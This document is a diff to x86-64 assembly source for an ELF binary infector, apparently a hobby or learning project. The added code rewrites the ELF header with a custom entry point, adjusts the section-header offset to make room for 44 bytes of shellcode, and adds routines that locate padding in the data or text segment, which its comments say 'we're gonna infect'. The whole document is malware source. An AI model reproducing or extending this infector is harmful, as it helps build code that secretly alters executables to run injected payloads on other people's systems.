@@ -434,13 +434,21 @@ push rdx
 	pop rdx
 	pop rcx
 retn
-
+%define SHELLCODE_LEN 44
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
 	;ELF HEADER
 	call has_data_seg
 	mov QWORD[rsp], rax
+	cmp rax, 0 ;We're gonna get pad to modify e_shoff
+	je pad_text
+	call get_data_pad
+	jmp pad_done
+	pad_text:
+	call get_text_pad
+	pad_done:
+	mov r10, rax; contains pad
 	call parse64elfheader
 	;PROGRAM HEADERS
 	cmp QWORD[rsp], 0
@@ -479,7 +487,7 @@ parse64elfheader:
 	mov rdx, 24 ; sizeof(Elf64_Ehdr) till entrypoint
 	push rax
 	mov rax, 1
-	syscall; write(wfd, file, sizeof(Elf64_Ehdr));
+	syscall; write(wfd, file, 24);
 	;Time to handle the entrypoint
 	pop rax
 	mov QWORD[rsp], rax;
@@ -489,11 +497,25 @@ parse64elfheader:
 	mov rdx, 8
 	mov rax, 1
 	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
+	;write e_phoff
+	mov rdx, 8
+	mov rsi, rbx
+	mov rax, 1
+	syscall; write(wfd, file + 32, 8);
+	mov QWORD[rsp], r10
+	add QWORD[rsp], SHELLCODE_LEN
+	mov rbx, [rsi + 8]; e_shoff
+	add QWORD[rsp], rbx
+	mov rbx, rsi
+	mov rsi, rsp
+	mov rax, 1
+	syscall;write(wfd, &(e_shoff + SHELLCODE_LEN + pad), 8);
 	;Copy the remainder of the elf header
 	mov rsi, rbx
-	mov rdx, 32
+	add rsi, 16
+	mov rdx, 16
 	mov rax, 1
-	syscall; write(wfd, file +32, 32); copying everything after entrypoint
+	syscall; write(wfd, file + 48, 16); copying everything after entrypoint
 
 
 	add rsp, 8
@@ -502,7 +524,7 @@ parse64elfheader:
 	pop rsi
 	pop rdi
 retn
-%define SHELLCODE_LEN 44
+
 ; unsigned long find_new_entry(void *file)
 ; will return the offset to begining of our shellcode
 find_new_entry:
@@ -745,6 +767,101 @@ has_data_seg:
 	pop rsi
 	pop rdi
 retn
+
+get_data_pad:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 56]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 32]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_gdp: 
+		cmp cx, WORD[rsp]
+		jge loop_gdp_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_gdp
+		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		jne continue_gdp
+		mov rax, QWORD[r9 + 40];p_memsz
+		sub rax, QWORD[r9 + 32]; - p_filesz
+		;data_seg found !
+		continue_gdp:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_gdp
+	loop_gdp_exit: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+get_text_pad:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 56]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 32]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_gtp: 
+		cmp cx, WORD[rsp]
+		jge loop_gtp_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_gtp
+		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
+		jne continue_gtp
+		mov rax, QWORD[r9 + 40];p_memsz
+		sub rax, QWORD[r9 + 32]; - p_filesz
+		;data_seg found !
+		continue_gtp:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_gtp
+	loop_gtp_exit: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
 ; unsigned long parse64elfphdr(void *file, int wfd)
 parse64elfphdr:
 	push rdi
